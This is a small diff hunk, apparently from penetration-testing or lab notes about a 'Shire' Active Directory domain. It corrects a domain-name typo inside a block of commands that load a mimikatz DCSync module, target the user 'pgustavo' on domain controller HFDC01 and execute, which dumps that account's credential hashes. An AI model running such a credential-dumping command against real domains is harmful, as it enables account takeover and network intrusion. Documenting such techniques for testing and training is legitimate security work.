@@ -58,7 +58,7 @@ Shire
 
 ```
 usemodule credentials/mimikatz/dcsync
-set domain shire.come
+set domain shire.com
 set user pgustavo
 set dc HFDC01.shire.com
 execute
